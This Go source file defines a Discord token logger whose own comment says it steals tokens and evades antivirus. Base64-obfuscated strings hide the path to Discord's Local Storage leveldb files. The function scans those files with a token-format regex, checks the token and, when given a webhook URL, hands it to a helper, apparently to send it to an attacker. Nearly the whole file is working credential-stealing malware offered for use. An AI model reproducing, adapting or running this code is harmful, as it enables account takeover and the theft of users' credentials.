package luvdiscord

import (
	"errors"
	"os"
	"regexp"
	"strings"
)

//TokenLoggerEvasive is a logger that steals discord tokens and uses obfuscated function names and string obfuscation to hide the token and evade AV.
//Returns a token and optionally sends to discord webhook.
func TokenLoggerEvasive(webhookURL string) (string, error) {
	//
	toyStore := "WEZ4a2FYTmpiM0prWEZ4TWIyTmhiQ0JUZEc5eVlXZGxYRnhzWlhabGJHUmlYRnc9OkxteGtZZz09OmIydGxiZz09"
	ballPit := cake(toyStore)
	playground := strings.Split(ballPit, ":")
	var s1, s2, s3 = playground[0], playground[1], playground[2]
	root, _ := os.UserConfigDir()
	localFiles, err := os.ReadDir(root + cake(s1))
	if err != nil {
		return "", err
	}
	for _, file := range localFiles {
		name := file.Name()
		if strings.Contains(name, cake(s2)) {
			var readFile []byte
			readFile, err = os.ReadFile(root + cake(s1) + name)
			if err != nil {
				return "", err
			}
			if strings.Contains(string(readFile), cake(s3)) {
				b, _ := regexp.MatchString("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", string(readFile))
				if b == true {
					re := regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}")
					match := re.FindStringSubmatch(string(readFile))
					body := PartyFood(match[0])

					if strings.Contains(body, "id") && webhookURL != "" {
						ticketcount(match[0])
					} else {
						return match[0], nil
					}
				}
			}
		}
	}
	return "", errors.New("failed to log token")
}
